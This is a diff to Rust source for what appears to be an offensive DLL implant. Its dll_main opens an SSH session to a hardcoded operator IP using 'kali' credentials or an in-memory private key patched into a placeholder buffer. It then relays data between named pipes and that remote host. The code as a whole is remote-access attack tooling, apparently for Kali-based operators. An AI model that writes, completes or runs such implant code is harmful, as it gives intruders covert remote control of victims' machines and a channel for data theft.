@@ -31,27 +31,25 @@ pub static USERNAME_STRING: &[u8; 66] = b"kali\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
 #[cfg(debug_assertions)]
 pub static PASSWORD_STRING: &[u8; 66] = b"kali\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
 
-pub static SSH_KEY: &[u8; 512] = &initialize_ssh_key_array();
-
-const fn initialize_ssh_key_array() -> [u8; 512] {
-    let mut key_array = [0u8; 512]; // Initialize the array with null bytes
+const fn initialize_ssh_key_array() -> [u8; 513] {
+    let mut key_array = [0u8; 513]; // Initialize the array with null bytes
 
     // Your original prefix string
-    let prefix = b"SSH_KEY_NO_CHANGE_PLS\0";
+    let prefix = b"SSH_KEY_NO_CHANGE_PLS\0"; // This is 23 bytes long
 
     // Copy the prefix into the beginning of the array
     let mut i = 0;
     while i < prefix.len() {
-        // This check is mostly for safety, prefix.len() (131) < key_array.len() (512)
-        if i < key_array.len() {
+        if i < key_array.len() { // Ensure we don't write out of bounds
             key_array[i] = prefix[i];
         }
         i += 1;
     }
-    // The rest of key_array remains filled with the initial 0u8 values.
+    // The rest of key_array remains filled with the initial 0u8 values (null bytes)
     key_array
 }
 
+pub static SSH_KEY: &[u8; 513] = &initialize_ssh_key_array();
 
 const SSH_PORT: u16 = 22;
 
@@ -75,10 +73,7 @@ pub fn dll_main() {
         None => return,
         Some(h) => h,
     };
-    let h_input_pipe = match initialize_input_pipe() {
-        None => return,
-        Some(h) => h,
-    };
+
     // Convert the IP address bytes to string more efficiently
     let ip_address = String::from_utf8_lossy(SSH_IPV4_ADDRESS).clone().trim_end_matches(char::from(0)).to_string();
     let server_address = format!("{}:{}", ip_address, SSH_PORT);
@@ -95,11 +90,22 @@ pub fn dll_main() {
     let username = String::from_utf8_lossy(USERNAME_STRING).clone().trim_end_matches(char::from(0)).to_string();
     let password = String::from_utf8_lossy(PASSWORD_STRING).clone().trim_end_matches(char::from(0)).to_string();
 
-    sess.userauth_password(&*username, &*password).unwrap();
-
-    if sess.authenticated() {
-        write_output(h_output_pipe, format!("Authenticated user {}.\n", username).as_str());
+    if password.len() < 1 {
+        // Authenticate with private key
+        let ssh_key = String::from_utf8_lossy(SSH_KEY).clone().trim_end_matches(char::from(0)).to_string();
+        sess.userauth_pubkey_memory(username.as_str(), None, &*ssh_key, None ).unwrap();
+    }else{
+        sess.userauth_password(&*username, &*password).unwrap();
+        if sess.authenticated() {
+            write_output(h_output_pipe, format!("Authenticated user {}.\n", username).as_str());
+        }
     }
+
+
+    let h_input_pipe = match initialize_input_pipe() {
+        None => return,
+        Some(h) => h,
+    };
 
     loop{
 
